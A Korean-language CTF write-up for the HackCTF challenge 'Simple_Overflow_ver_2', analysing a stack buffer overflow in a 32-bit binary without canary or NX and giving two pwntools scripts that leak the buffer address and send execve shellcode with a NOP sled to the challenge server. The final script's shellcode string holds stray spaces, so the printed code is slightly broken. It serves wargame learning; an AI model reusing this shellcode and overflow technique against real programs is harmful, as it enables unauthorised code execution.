**HackCTF - Simple_Overflow_ver_2**

| layout | title                           | auther   | categories | tags           |
| ------ | ------------------------------- | -------- | ---------- | -------------- |
| post   | HackCTF - Simple_Overflow_ver_2 | Y3oj4eng | writeup    | writeupwargame |



# Anlaysis

---

`file` 명령어를 통해 `binary`의 정보를 획득한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ file Simple_overflow_ver_2 
Simple_overflow_ver_2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=8225d06464b48b5f4859fb16d8458cf33768f5de, not stripped

```

`ELF 32bit` 프로그램이다.

이어서 `checksec`명령어를 통해 바이너리에 적용된 `mitigation` 을 확인한다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ checksec Simple_overflow_ver_2 
[*] '/home/mac/Desktop/hackCTF/Simple_overflow_ver_2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```



분석을 실행하기에 앞서 `binary`를 한번 실행시켜본다.

```bash
mac at ubuntu in ~/Desktop/hackCTF
$ ./Simple_overflow_ver_2 
Data : AAAAAAAAAAAAAAAAAAAAAAAA
0xffd01b30:  A A A A A A A A A A A A A A A A
0xffd01b40:  A A A A A A A A
Again (y/n): y
Data : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
0xffd01b30:  A A A A A A A A A A A A A A A A
0xffd01b40:  A A A A A A A A A A A A A A A A
0xffd01b50:  A A A a
Again (y/n): n

```

이번 문제는 이전 문제들과는 달리 분기를 통해 반복을 진행한다.

`binary`를 실행시키면 `Data :`라는 문자열을 출력한 이후, 사용자로부터 입력을 받는다.

이후 입력받은 값을 일련의 주소값과 함께 출력해준뒤, `Again (y/n): `이라는 문자열을 출력하여

반복 여부를 물어본다.

코드를 분석해보자.

![image](https://user-images.githubusercontent.com/33051018/75776875-32fbdb00-5d98-11ea-9eb8-0de6d3a34e49.png)

`main` 함수이다.

`opt`변수에 `y`값을 초기화해놓고 `do~while`문으로 들어간다.

`Data : `문자열을 출력한뒤 분기문 내에서 `scanf`함수를 통해 `buffer`변수에 값을 입력받는다.

`buffer` 변수는 128bytes 길이지만, 입력을 받을떄 입력값의 길이를 검증하지 않아 `BOF`취약점이 존재한다.

이후 `i`변수를 통해 반복문을 돌며 입력받은 데이터의 길이만큼 반복하며 값을 출력한다.

출력하는 패턴은 아래와 같다.

> 1. `i` 변수 값이 16을 넘어가면 참조하고 있는 버퍼의 주소 출력 - > `if( !(i & 0xF))`
> 2. `i % 16` 모듈러 연산값이 15인경우 즉, 15, 31, 46...etc인 경우  10byte 공백 출력
> 3. 그 외의 경우, 참조하는 데이터값 출력

위 패턴으로 `strlen(buffer)`만큼의 길이를 반복한 뒤,다시 반복을 진행할 것인지에 대한 여부를 확인한다.

# Exploit

---



## 1차 시도 코드

```python
from pwn import *                                                       
                                                                       
p = process('./Simple_overflow_ver_2')                                  
                                                                       
# dummy = 136bytes + 8byters                                            
                                                                       
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\x    b0\x0b\xcd\x80'      # 25vytes
                                                                                                                                            
payload1 = 'AAAAAAAAAA'                                                 
                                                                         
p.recvuntil('Data : ')                                                  
p.sendline(payload1)                                                    
                                                                        
buf_addr = int(p.recv(10), 16)                                          
print('Buf_Addr : ' + str(buf_addr))                                                               
                                                                         
payload2 = '\x90'*119                                                   
payload2 += shellcode                                                   
payload2 += p32(buf_addr)                                               
                                                                        
p.recvuntil('Again (y/n): ')                                            
p.sendline('y')                                                         
print("Send Y")                                                         
                                                                        
p.recvuntil('Data : ')                                                  
p.sendline(payload2)                                                    
                                                                         
p.interactive()
```

 실행된 프로그램 내에서는 반복을 계속하여도 `buf`의 주소가 변하지 않는다는 것을 확인하고 첫 입력에는 `buf`의 주소를 획득하기 위해 아무 데이터를 전달하였다. 이후 `shellcode`와 `Nop`의 조합으로 `payload`를 작성하여 두번쨰 입력을 받는 부분에서 `payload`를 전달하였다.

음.. 하지만 익스에 실패하였다.

수정을 하고 또 하고 몇번의 시도 끝에 결국 익스에 성공하였다.



## 최종 code

----

```python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3006)
#p = process('./Simple_overflow_ver_2')
p.recvuntil('Data : ')
p.sendline('AAAA')
buf_addr = int(p.recv(10), 16)

p.recvuntil('Again (y/n): ')
p.sendline('y')
p.recvuntil('Data : ')

payload = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x6    8\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'
payload += '\x90'*115
payload += p32(buf_addr)

p.sendline(payload)
p.interactive()
```



위 코드의 `payload`에서 쉘코드와 `Nop sled`의 위치를 바꾸면 익스가 되지 않는다..~~아직까지 이유를 파악하지 못했다.~~

이번 문제를 풀면서 `Debugging`의 필요성을 크게 느꼈다.

`pwntools` 기능에 대해 좀 더 깊게 공부하고 디버깅 방법을 연습해야겠다.



